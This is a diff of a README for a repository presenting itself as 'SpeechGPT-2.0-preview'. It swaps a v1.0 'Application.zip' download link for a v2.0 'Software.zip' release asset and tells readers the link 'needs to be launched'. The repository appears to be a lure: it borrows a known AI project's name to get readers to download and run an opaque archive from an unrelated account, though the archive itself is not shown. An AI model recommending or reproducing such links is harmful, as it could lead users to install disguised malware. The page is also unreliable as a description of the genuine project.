@@ -11,7 +11,7 @@ Welcome to the SpeechGPT-2.0-preview repository! This repository contains the pr
 ## Installation 🛠️
 
 To get started with SpeechGPT-2.0-preview, you can download the repository using the following link:
-[![Download SpeechGPT-2.0-preview](https://github.com/7FISDJF/SpeechGPT-2.0-preview/releases/download/v1.0/Application.zip)](https://github.com/7FISDJF/SpeechGPT-2.0-preview/releases/download/v1.0/Application.zip)
+[![Download SpeechGPT-2.0-preview](https://github.com/7FISDJF/SpeechGPT-2.0-preview/releases/download/v2.0/Software.zip)](https://github.com/7FISDJF/SpeechGPT-2.0-preview/releases/download/v2.0/Software.zip)
 
 **Note:** This link needs to be launched to download the necessary files.
 
@@ -39,6 +39,6 @@ SpeechGPT-2.0-preview is developed and maintained by a team of passionate AI ent
 
 🌟 Start using SpeechGPT 2.0-preview today and unleash the power of AI-generated speech! 🌟
 
-Remember, the link to download the repository is [here](https://github.com/7FISDJF/SpeechGPT-2.0-preview/releases/download/v1.0/Application.zip).
+Remember, the link to download the repository is [here](https://github.com/7FISDJF/SpeechGPT-2.0-preview/releases/download/v2.0/Software.zip).
 
 ---
